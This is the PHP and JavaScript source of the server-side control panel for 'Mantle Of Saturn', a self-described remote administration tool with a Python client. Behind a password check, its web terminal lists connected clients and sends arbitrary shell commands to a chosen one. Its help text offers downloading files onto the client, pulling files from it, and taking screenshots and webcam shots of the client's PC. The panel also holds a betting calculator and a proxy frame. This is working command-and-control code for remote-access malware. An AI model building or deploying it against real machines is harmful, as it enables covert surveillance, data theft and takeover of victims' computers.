<?php
/*

    Mantle Of Saturn - Remote Administration Tool Based on PHP Server and Python Client
    Copyright (C) 2021  Nikolaos Bazigos

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
    
    Official Websites : mantleofsaturn.com , sourcecode347.com
    GitHub : https://github.com/sourcecode347/MantleOfSaturn
    
*/   
include("md5password.php"); 
include_once("timezones.php");
header("Content-Type: text/html; charset=utf-8");
	#error_reporting(E_ALL);
	ini_set('display_errors', 0);
	######################################
	###  SETTINGS
	######################################
	$server='localhost';
	$root='root';
	$rootpass='';
	$db='';
	$db3='';
	$domain='https://mantleofsaturn.com';
	$hreflink='https://mantleofsaturn.com/index.php';
	$ogurl='https://mantleofsaturn.com/index.php';
	$favicon="img/avatar.png";
	$homeicon="";
	$ptitle="Mantle Of Saturn Coded By SourceCode347";
	$ogimage="img/webbackground.png";
	$pdescription="Mantle Of Saturn Coded By SourceCode347";
	$zdescription="mantle,of,saturn";
	$yandexVer='';
	$alexaVer='';
	$googleVer='';
	$bingVer='';
	$copyright=" 2021 www.mantleofsaturn.com";
	$breakword=3; # Default = 3+
?>
<!DOCTYPE html>
<html>
	<head>
        <link rel="stylesheet" type="text/css" href="styles.css"/>
		<style>
			@font-face {
  				font-family: "calculator";
  				src:url("fonts/Calculator.ttf");
			}
			p1 {color: yellow;font-size:24px;
				text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black;
			}
			p2 {color: yellow;font-size:18px;
				text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black;
			}
			p3 {color: yellow;font-size:20px;
				text-shadow: -1px 0 black, 0 1px black, 1px 0 black, 0 -1px black;
			}
			#calculator{width:400px;height:640px;background-color:#000000;float:left;border: 2px grey solid;margin:10px;}
			#text1{width:396px;height:60px;background-color:#000000;color:#00F000;float:left;top:0px;left:0px;display: flex;border: 2px grey solid;overflow:hidden;}
			#text2{width:396px;height:100px;background-color:#000000;color:#00F000;float:left;top:64px;left:0px;display: flex;border: 2px grey solid;overflow:hidden;}
			#display{width:396px;height:80px;background-color:#00F000;color:#000000;font-family:calculator;font-size:72px;float:left;top:168px;left:0px;display: flex;border: 2px grey solid;overflow:hidden;}
			#buttonboard{width:396px;height:428px;background-color:#000000;float:left;top:252px;left:0px;border: 2px grey solid;overflow:hidden;}
			.cbutton3{width:75px;height:65px;font-size:25px;font-weight:bold;color:#FFFFFF;padding:10px;margin:10px;background-color:grey;cursor:pointer;}
			.cbutton2{width:370px;height:65px;font-size:25px;font-weight:bold;color:#FFFFFF;padding:10px;margin:10px;background-color:grey;cursor:pointer;}
			.cbutton2:hover{width:370px;height:65px;font-size:25px;font-weight:bold;color:#FFFFFF;padding:10px;margin:10px;background-color:blue;cursor:pointer;}
			.cbutton3:hover{width:75px;height:65px;font-size:25px;font-weight:bold;color:#FFFFFF;padding:10px;margin:10px;background-color:blue;cursor:pointer;}
		</style>
        <link rel="icon" type="image/png" href="<?php echo $favicon; ?>" />
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="index, follow, noodp, noydir">
		<meta name="distribution" content="web"/>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title><?php echo $ptitle; ?></title>
		<link rel="alternate" href="<?php echo $hreflink;?>" hreflang="<?php echo $hreflang;?>"/>
		<meta name="description" content="<?php echo $pdescription; ?>" />
		<meta property="og:image" content="<?php echo $ogimage;?>"/>
		<meta property="og:image:url" content="<?php echo $ogimage;?>"/>
		<meta property="og:title" content="<?php echo $ptitle;?>"/>
		<meta property="og:description" content="<?php echo $pdescription;?>"/>
		<meta property="og:url" content="<?php echo $ogurl;?>"/>
		<meta name="keywords" content="<?php echo $zdescription;?>"/>
		<meta name='yandex-verification' content='<?php echo $yandexVer; ?>' />
		<meta name="alexaVerifyID" content="<?php echo $alexaVer; ?>"/>
		<meta name="google-site-verification" content="<?php echo $googleVer; ?>" />
		<meta name="msvalidate.01" content="<?php echo $bingVer; ?>" />

		<script src="jquery-v3.4.1.js"></script>
	</head>	
	<body id='Body' style='background-image: radial-gradient(#ffffff, #fcfcfc, #cccccc);width:100%;height:100%;margin-top:0px;'>
    	<div id='header'>
                <form id='logoutform' action='' method='post'>
                    <img src='img/logout.png' onclick='logoutaction();' style='cursor:pointer;width:44px;height:44px;float:right;margin-right:10px;margin-top:3px;'/></img>
                </form>
                <script>
                    function logoutaction(){
                        document.getElementById("logoutform").submit()
                    }
                </script>
            <center>
                <p16>MANTLE OF SATURN</p16>
            </center>
        </div>
		<div id='betoscontent'>
			<div id='betosflow'>
                <?php
                    $ospassword="";
                    if(isset($_POST['ospassword'])){$ospassword=md5($_POST['ospassword']);}
                    if($ospassword!=$md5password){
                        echo "<div id='article'>
                            <center>
                            <form action='' method='post'>
                                <br><br><br>
                                <img src='img/avatar.png' style='width:320px;height:320px;'/><br><br>
                                <p style='font-size:24px;font-family:Cracked_Code;color:#000000;'>SOURCECODE347</p><br><br>
                                <input type='password' name='ospassword' style='width:420px;height:50px;font-size:40px;'/><br><br>
                                <input type='submit' value='Sign in' class='cbutton'/><br><br>
                            </center>
                        </div>";
                    }
                    if($ospassword==$md5password){
                        echo "
                        <div class='betos-icons'>
                            <img src='img/terminal.png' style='width:64px;height:64px;float:left;margin:10px;cursor:pointer;' onclick='openapp(\"betterminal\")'/><br><br>
                            <p style='margin-left:10px;'> SourceCode347 Terminal </p>
                        </div>
                        <div class='betos-icons'>
                            <img src='img/betcalc.png' style='width:64px;height:64px;float:left;margin:10px;cursor:pointer;' onclick='openapp(\"betcalculator\")'/>
                            <p style='margin-left:10px;'> Bet Calculator </p>
                        </div>
                        <div class='betos-icons'>
                            <img src='img/browser.png' style='width:64px;height:64px;float:left;margin:10px;cursor:pointer;' onclick='openapp(\"proxy\")'/>
                            <p style='margin-left:10px;'> Proxy </p>
                        </div>
                        <div id='betterminal' onclick='changezindex(\"betterminal\")' style='font-size:20px;visibility:hidden;width:720px;height:580px;left:100px;top:100px;position: absolute;z-index: 9;background-color:#000000;color:#00F000;border: 1px solid #d3d3d3;text-align: left;opacity:0.75;'>
                            <div id='betterminalheader' style='height:25px;padding: 5px;cursor: move;z-index: 10;background-color:#20E20C;color: #000000;opacity:1;'>
                                <p23 style='float:left;font-family:fb;font-size:20px;font-weight:bold;color:#000000;'>SourceCode347 Terminal</p23>
                                <input type='image'  onclick='closeapp(\"betterminal\")' src='img/close.png' style='height:30px;width:30px;float:right;' />
                                <input type='image'  onclick='maximize(\"betterminal\")' src='img/maximize.png' style='height:30px;width:30px;float:right;margin-right:10px;' />
                                <input type='image'  onclick='minimize(\"betterminal\")' src='img/minimize.png' style='height:30px;width:30px;float:right;margin-right:10px;' />
                            </div>
                            <input id='cmd' type='text' placeholder='Type a Command...' style='font-size:22px;height:35px;width:100%;bottom:0px;position:absolute;left:0px;right:149px;cursor: move;z-index: 10;'/>
                            <p id='cmdinput'>SourceCode347> </p>
                            <div id='cmdoutput' style='overflow-y:scroll;width:100%;height:87%;'></div>
                            <input id='activeclient' type='hidden' value='Active Client Not Setted'/>
                            <script>
                                setInterval(function(){
                                    var ac = document.getElementById('activeclient').value;
                                    if(ac!='Active Client Not Setted'){
                                        $.ajax({
                                            url: 'data.php',
                                            type: 'post',
                                            data: { 'getoutput': ac },
                                            success: function(response) {
                                                cmdoutput=response;
                                                if(cmdoutput!=''){
                                                    document.getElementById('cmdoutput').innerHTML=cmdoutput+'<br><br>';
                                                }
                                            }
                                        });
                                    }
                                }, 3000);
                                var input = document.getElementById('cmd');
                                input.addEventListener('keypress', function(ev){
                                    if(ev.keyCode === 13 || ev.which === 13){
                                        document.getElementById('cmdoutput').innerHTML='';
                                        var cmd = input.value;
                                        cmd=cmd.replace('<x','');
                                        cmd=cmd.replace('<X','');
                                        document.getElementById('cmdinput').innerHTML='SourceCode347> '+cmd;
                                        input.value ='';
                                        /*if (cmd=='getclients'){
                                            $.ajax({
                                                url: 'data.php',
                                                type: 'post',
                                                data: { 'getclients': 'getclients' },
                                                success: function(response) {
                                                    cmdoutput='';
                                                    gccounter=1;
                                                    clients = response;
                                                    for (x in clients){
                                                        cmdoutput+=gccounter+' : '+clients[x]+'<br>';
                                                        gccounter+=1;
                                                    }
                                                    document.getElementById('cmdoutput').innerHTML=cmdoutput;
                                                }
                                            });
                                        }*/
                                        if (cmd.includes('getclients')){
                                            var setclient=0;
                                            if (parseInt(cmd.replace('getclients ',''))>0){
                                                setclient=parseInt(cmd.replace('getclients ',''));
                                            }
                                            $.ajax({
                                                url: 'data.php',
                                                type: 'post',
                                                data: { 'getclients': 'getclients' },
                                                success: function(response) {
                                                    cmdoutput='';
                                                    gccounter=1;
                                                    clients = response;
                                                    for (x in clients){
                                                        cmdoutput+=gccounter+' : '+clients[x]+'<br>';
                                                        if(setclient==gccounter){
                                                            document.getElementById('activeclient').value=clients[x];
                                                        }
                                                        gccounter+=1;
                                                    }
                                                    if(cmdoutput==''){
                                                        cmdoutput='0 clients';
                                                    }
                                                    if(setclient>0){
                                                        cmdoutput=document.getElementById('activeclient').value;
                                                    }
                                                    document.getElementById('cmdoutput').innerHTML=cmdoutput;
                                                }
                                            });
                                        }
                                        else if (cmd.includes('onlineclients')){
                                            var setclient=0;
                                            if (parseInt(cmd.replace('onlineclients ',''))>0){
                                                setclient=parseInt(cmd.replace('onlineclients ',''));
                                            }
                                            $.ajax({
                                                url: 'data.php',
                                                type: 'post',
                                                data: { 'onlineclients': 'onlineclients' },
                                                success: function(response) {
                                                    cmdoutput='';
                                                    gccounter=1;
                                                    clients = response;
                                                    for (x in clients){
                                                        cmdoutput+=gccounter+' : '+clients[x]+'<br>';
                                                        if(setclient==gccounter){
                                                            document.getElementById('activeclient').value=clients[x];
                                                        }
                                                        gccounter+=1;
                                                    }
                                                    if(cmdoutput==''){
                                                        cmdoutput='0 online clients';
                                                    }
                                                    if(setclient>0){
                                                        cmdoutput=document.getElementById('activeclient').value;
                                                    }
                                                    document.getElementById('cmdoutput').innerHTML=cmdoutput;
                                                }
                                            });
                                        }
                                        else if (cmd=='activeclient'){
                                            document.getElementById('cmdoutput').innerHTML=document.getElementById('activeclient').value;
                                        }
                                        else if (cmd.includes('imgviewer')){
                                            ac = document.getElementById('activeclient').value;
                                            if(ac!='Active Client Not Setted'){
                                                var img = cmd.replace('imgviewer ','');
                                                ac = document.getElementById('activeclient').value;
                                                img = 'clients/'+ac+'/'+img;
                                                document.getElementById('clientimg').src=img;
                                                changezindex('imgviewer');
                                                openapp('imgviewer');
                                            }else{
                                                document.getElementById('cmdoutput').innerHTML='You must Have An Active Client :<br>Please Type --help';
                                            }
                                        }
                                        else if (cmd.includes('filesview')){
                                            ac = document.getElementById('activeclient').value;
                                            if(ac!='Active Client Not Setted'){
                                                $.ajax({
                                                    url: 'data.php',
                                                    type: 'post',
                                                    data: { 'filesview': ac },
                                                    success: function(response) {
                                                        data = response;
                                                        cmdouput=''
                                                        for (x in data){
                                                            cmdoutput+=data[x]+'<br>';
                                                        }
                                                        if(data.length==0){cmdoutput='Empty Server Directory for Client '+ac;}
                                                        document.getElementById('cmdoutput').innerHTML=cmdoutput;
                                                    }
                                                });
                                            }
                                            else{
                                                document.getElementById('cmdoutput').innerHTML='You must Have An Active Client :<br>Please Type --help';
                                            }
                                        }
                                        else if (cmd.includes('delfile')){
                                            file = cmd.replace('delfile ','')
                                            ac = document.getElementById('activeclient').value;
                                            if(ac!='Active Client Not Setted'){
                                                $.ajax({
                                                    url: 'data.php',
                                                    type: 'post',
                                                    data: { 'delfile': ac , 'file': file },
                                                    success: function(response) {
                                                        data = response;
                                                        if (data == 'success'){
                                                            cmdoutput=file+' Deleted Succesfully';
                                                        }else{
                                                            cmdoutput='Error : '+file+' Not Deleted';
                                                        }
                                                        document.getElementById('cmdoutput').innerHTML=cmdoutput;
                                                    }
                                                });
                                            }
                                            else{
                                                document.getElementById('cmdoutput').innerHTML='You must Have An Active Client :<br>Please Type --help';
                                            }
                                        }
                                        else if (cmd=='--help'){
                                            document.getElementById('cmdoutput').innerHTML='Basic Commands :<br><br>getclients : Showing All Clients<br>onlineclients : Showing Online Clients<br>onlineclients number : Set Client As Active Client (number as the number of online client)<br>activeclient : Showing The Active Client<br>fdown https://example.com/filename.zip filename.zip : Downloads a file from internet to client<br>upload file.zip : Upload a file from client to server (supported formats = jpg,png,gif,zip,tar)<br>pic screenshot.png : Takes a screenshot of client\'s PC<br>cam camshot.jpg : Takes a camshot from client\'s camera<br>set sleeptime integer : integer as the seconds while sleep client before recommunicate with server . Default = set sleeptime 3<br>imgviewer image.png : Showing an image if uploaded to server , only for the specific activeclient<br>filesview : Showing all files from server , only for the specific activeclient<br>delfile filename.ext : Delete a file from server , only for the specific activeclient<br><br>* You Can Run Advanced Commands Based On Client\'s OS System<br><br>';
                                        }else{
                                            $.ajax({
                                                url: 'data.php',
                                                type: 'post',
                                                data: { 'client': document.getElementById('activeclient').value , 'cmd': cmd },
                                                success: function(response) {
                                                    bamies='bamies';
                                                }
                                            });                                            
                                        }
                                    }
                                });
                            </script>
                        </div>
                        <div id='betcalculator' onclick='changezindex(\"betcalculator\")' style='visibility:hidden;width:420px;height:740px;left:100px;top:100px;position: absolute;z-index: 9;background-color:#000000;color:green;border: 1px solid #d3d3d3;'>
                            <div id='betcalculatorheader' style='height:25px;padding: 5px;cursor: move;z-index: 10;background-color:#20E20C;color: #000000;opacity:1;'>
                                <p23 style='float:left;font-family:fb;font-size:20px;font-weight:bold;color:#000000;'>Bet Calculator</p23>
                                <input type='image' onclick='closeapp(\"betcalculator\")' src='img/close.png' style='height:30px;width:30px;float:right;' />
                            </div>
                            <div id='calculator'>
                                <div id='text1'><p2>TotalBets : 0 , TotalStakeAmount : 0 , Return : 0 </p2></div>
                                <div id='text2'><p2>Place a bet and insert the stake amount !<br> example 0.20 and then click OK</p2></div>
                                <div id='display'></div>
                                <div id='buttonboard'>
                                    <button class='cbutton3' value='7' onclick='calculator(this.value);'><p1>7</p1></button>
                                    <button class='cbutton3' value='8' onclick='calculator(this.value);'><p1>8</p1></button>
                                    <button class='cbutton3' value='9' onclick='calculator(this.value);'><p1>9</p1></button>
                                    <button class='cbutton3' onclick='calcwin();'><p3>WIN</p3></button>
                                    <button class='cbutton3' value='4' onclick='calculator(this.value);'><p1>4</p1></button>
                                    <button class='cbutton3' value='5' onclick='calculator(this.value);'><p1>5</p1></button>
                                    <button class='cbutton3' value='6' onclick='calculator(this.value);'><p1>6</p1></button>
                                    <button class='cbutton3' onclick='calccash();'><p3>CASH</p3></button>
                                    <button class='cbutton3' value='1' onclick='calculator(this.value);'><p1>1</p1></button>
                                    <button class='cbutton3' value='2' onclick='calculator(this.value);'><p1>2</p1></button>
                                    <button class='cbutton3' value='3' onclick='calculator(this.value);'><p1>3</p1></button>
                                    <button class='cbutton3' onclick='calclose();'><p3>LOSE</p3></button>
                                    <button class='cbutton3' value='c' onclick='rcalc();'><p1>C</p1></button>
                                    <button class='cbutton3' value='0' onclick='calculator(this.value);'><p1>0</p1></button>
                                    <button class='cbutton3' value='.' onclick='calculator(this.value);'><p1>.</p1></button>
                                    <button class='cbutton3' onclick='calcok();'><p3>OK</p3></button>
                                    <button class='cbutton2'onclick='calcreset();'><p3>RESET</p3></button>
                                </div>
                            </div>
                        </div>
                        <div id='proxy' onclick='changezindex(\"proxy\")' style='visibility:hidden;width:720px;height:580px;left:100px;top:100px;position: absolute;z-index: 9;background-color:#000000;color:#00F000;border: 1px solid #d3d3d3;text-align: left;opacity:0.75;'>
                            <div id='proxyheader' style='height:25px;padding: 5px;cursor: move;z-index: 10;background-color:#20E20C;color: #000000;opacity:1;'>
                                <p23 style='float:left;font-family:fb;font-size:20px;font-weight:bold;color:#000000;'>Proxy</p23>
                                <input type='image' onclick='closeapp(\"proxy\")' src='img/close.png' style='height:30px;width:30px;float:right;' />
                            </div>
                            <iframe id='website' src='' style='top:35px;left:0px;right:0px;width:100%;height:90%;bottom:0px;position:absolute;'></iframe>
                        </div>
                        <div id='imgviewer' onclick='changezindex(\"imgviewer\")' style='font-size:20px;visibility:hidden;width:720px;height:580px;left:100px;top:100px;position: absolute;z-index: 9;background-color:#000000;color:#00F000;border: 1px solid #d3d3d3;text-align: left;opacity:1;'>
                            <div id='imgviewerheader' style='height:25px;padding: 5px;cursor: move;z-index: 10;background-color:#20E20C;color: #000000;opacity:1;'>
                                <p23 style='float:left;font-family:fb;font-size:20px;font-weight:bold;color:#000000;'>IMGViewer</p23>
                                <input type='image'  onclick='closeapp(\"imgviewer\")' src='img/close.png' style='height:30px;width:30px;float:right;' />
                                <input type='image'  onclick='maximize(\"imgviewer\")' src='img/maximize.png' style='height:30px;width:30px;float:right;margin-right:10px;' />
                                <input type='image'  onclick='minimize(\"imgviewer\")' src='img/minimize.png' style='height:30px;width:30px;float:right;margin-right:10px;' />
                            </div>
                            <img id='clientimg' src='img/webbackground.png' style='width:100%;height:100%;margin-top:0px;position:absolute;'/></img> 
                        </div>";
                    }
                ?>
                </div>
            </div>
<?php
if($ospassword==$md5password){
$appelem = array("betterminal","betcalculator","imgviewer","proxy");
for($x=0;$x<count($appelem);$x++){
    echo '
    <script>
        // Make the DIV element draggable:
        dragElement(document.getElementById("'.$appelem[$x].'"));

        function dragElement(elmnt) {
          var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
          if (document.getElementById(elmnt.id + "header")) {
            // if present, the header is where you move the DIV from:
            document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
          } else {
            // otherwise, move the DIV from anywhere inside the DIV:
            elmnt.onmousedown = dragMouseDown;
          }

          function dragMouseDown(e) {
            e = e || window.event;
            e.preventDefault();
            // get the mouse cursor position at startup:
            pos3 = e.clientX;
            pos4 = e.clientY;
            document.onmouseup = closeDragElement;
            // call a function whenever the cursor moves:
            document.onmousemove = elementDrag;
          }

          function elementDrag(e) {
            e = e || window.event;
            e.preventDefault();
            // calculate the new cursor position:
            pos1 = pos3 - e.clientX;
            pos2 = pos4 - e.clientY;
            pos3 = e.clientX;
            pos4 = e.clientY;
            // set the element\'s new position:
            if(pos4>50){
            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
            }
            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
          }

          function closeDragElement() {
            // stop moving when mouse button is released:
            document.onmouseup = null;
            document.onmousemove = null;
          }
        }    
    </script>';
}
echo '
<script>
function openapp(app){
	document.getElementById(app).style.visibility="visible";
}
function closeapp(app){
	document.getElementById(app).style.visibility="hidden";
}
function maximize(app){
    document.getElementById(app).style.width="90%";
    document.getElementById(app).style.height="90%";
    document.getElementById(app).style.fontSize="24px";
}
function minimize(app){
    document.getElementById(app).style.width="720px";
    document.getElementById(app).style.height="580px";
    document.getElementById(app).style.fontSize="20px";
}
var appelem = ["betterminal","betcalculator","imgviewer","proxy"];
function changezindex(elem){
    for (x in appelem){
        if(elem==appelem[x]){
            document.getElementById(elem).style.zIndex = "9";
        }else{
            document.getElementById(appelem[x]).style.zIndex = "8";
        }
    }
}

//bet calculator
	var totalbets=0;
	var totalstakeamount=0;
	var startbetamount=0;
	var status="start";
	var betreturn=0;
	function findbetvalue(hands,betamount,bodd,sba){
		hvalue=parseFloat(sba)*parseFloat(hands);
		tbet=parseFloat(betamount)+parseFloat(hvalue);
		fr=parseFloat(0.1);
		while (true){
			if (fr*bodd >=tbet){
				return fr;
			}
			fr=parseFloat(fr)+parseFloat(0.1);
			tbet=tbet+parseFloat(0.1);
		}
	}
	function calcwin(){
		if (status=="wcl"){
			startbetamount=0;
			totalbets=0;
			totalstakeamount=0;
			document.getElementById("text1").innerHTML="<p2>TotalBets : 0 , TotalStakeAmount : 0 , Return : 0</p2>";
			if(betreturn==0){
				document.getElementById("text2").innerHTML="<p2>You Win ! Place a bet and insert the stake amount !<br> example 0.20 and then click OK</p2>";
			}else{
				document.getElementById("text2").innerHTML="<p2>You Win "+betreturn.toFixed(2)+"! Place a bet and insert the stake amount !<br> example 0.20 and then click OK</p2>";
			}
			document.getElementById("display").innerHTML="";
			status="start";
			betreturn=0;
		}
	}
	function calclose(){
		if(status=="wcl"){
			document.getElementById("text2").innerHTML="<p2>You Lose ! Enter the Odd of Next Event !<br> example 1.85 and then click OK</p2>";
			document.getElementById("display").innerHTML="";
			status="lose";
		}
	}
	function calccash(){
		if(status=="wcl"){
			document.getElementById("text2").innerHTML="<p2>Enter Cash Out Amount ! Example 2.56 and then click OK</p2>";
			document.getElementById("display").innerHTML="";
			status="cash";
		}
	}
	function calcok(){
		if (status=="start" && document.getElementById("display").innerHTML!=""){
			startbetamount+=parseFloat(document.getElementById("display").innerHTML);
			totalbets+=1;
			totalstakeamount+=parseFloat(document.getElementById("display").innerHTML);
			document.getElementById("text1").innerHTML="<p2>TotalBets : "+totalbets+" , TotalStakeAmount : "+totalstakeamount.toFixed(2)+" , Return : ?</p2>";
			document.getElementById("text2").innerHTML="<p2>You have an open bet,Wait the result and Press Win , Cash or Lose !</p2>";
			status="wcl";
		}
		if (status=="lose" && document.getElementById("display").innerHTML!=""){
			totalbets+=1;
			odd=parseFloat(document.getElementById("display").innerHTML);
			oddvalue=findbetvalue(totalbets,totalstakeamount,odd,startbetamount);
			totalstakeamount+=parseFloat(oddvalue);
			betreturn=odd*parseFloat(oddvalue);
			document.getElementById("text1").innerHTML="<p2>TotalBets : "+totalbets+" , TotalStakeAmount : "+totalstakeamount.toFixed(2)+" , Return : "+betreturn.toFixed(2)+"</p2>";
			document.getElementById("text2").innerHTML="<p2>Place a bet with "+oddvalue.toFixed(2)+" stake amount at odd "+odd.toFixed(2)+"!<br> Wait the result and press Win, Cash or Lose !</p2>";
			document.getElementById("display").innerHTML=oddvalue.toFixed(2);
			status="wcl";
		}
		if (status=="cash" && document.getElementById("display").innerHTML!=""){
			cash=parseFloat(document.getElementById("display").innerHTML);
			totalstakeamount-=cash;
			if(totalstakeamount<0){
				startbetamount=0;
				totalbets=0;
				totalstakeamount=0;
				document.getElementById("text1").innerHTML="<p2>TotalBets : 0 , TotalStakeAmount : 0 , Return : 0</p2>";
				document.getElementById("text2").innerHTML="<p2>You Win "+cash.toFixed(2)+"! Place a bet and insert the stake amount !<br> example 0.20 and then click OK</p2>";
				document.getElementById("display").innerHTML="";
				betreturn=0;
				status="start";
			}else{
				document.getElementById("text2").innerHTML="<p2>You Cash Out "+cash.toFixed(2)+" ! Enter the Odd of Next Event !<br> example 1.85 and then click OK</p2>";
				document.getElementById("display").innerHTML="";
				status="lose";
			}
		}
	}
	function calcreset(){
		startbetamount=0;
		totalbets=0;
		totalstakeamount=0;
		document.getElementById("text1").innerHTML="<p2>TotalBets : 0 , TotalStakeAmount : 0 , Return : 0</p2>";
		document.getElementById("text2").innerHTML="<p2>Place a bet and insert the stake amount !<br> example 0.20 and then click OK</p2>";
		document.getElementById("display").innerHTML="";
		status="start";
		betreturn=0;
	}
	function calculator(value){
		document.getElementById("display").innerHTML+=value;
	}
	function rcalc(){
		text=document.getElementById("display").innerHTML;
		newtext="";
		for(var i=0;i<text.length-1;i++){
			newtext+=text[i];
		}
		document.getElementById("display").innerHTML=newtext;
	}
//End Bet Calculator
</script>';
}
?>
	</body>
</html>
